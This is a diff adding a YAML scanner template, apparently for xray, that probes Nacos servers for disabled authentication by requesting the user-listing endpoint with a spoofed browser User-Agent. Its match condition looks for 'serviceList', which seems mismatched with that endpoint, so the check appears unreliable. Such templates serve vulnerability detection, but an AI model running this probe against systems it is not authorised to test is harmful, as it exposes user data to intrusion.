@@ -1,0 +1,20 @@
+name: poc-yaml-nacos-unauthorized
+transport: http
+rules:
+  r1:
+    request:
+      method: GET
+      path: /nacos/v1/auth/users?pageNo=1&pageSize=1
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+    expression: |
+      response.status_code==200 && operator.contains(response.text,'"serviceList":')
+expression: r1()
+detail:
+  name: 'Nacos鉴权未开启'
+  author: qianxiao996
+  group: 未授权访问
+  category: Nacos
+  vuln_id: 无
+  description: 'Nacos鉴权未开启'
+  links: []
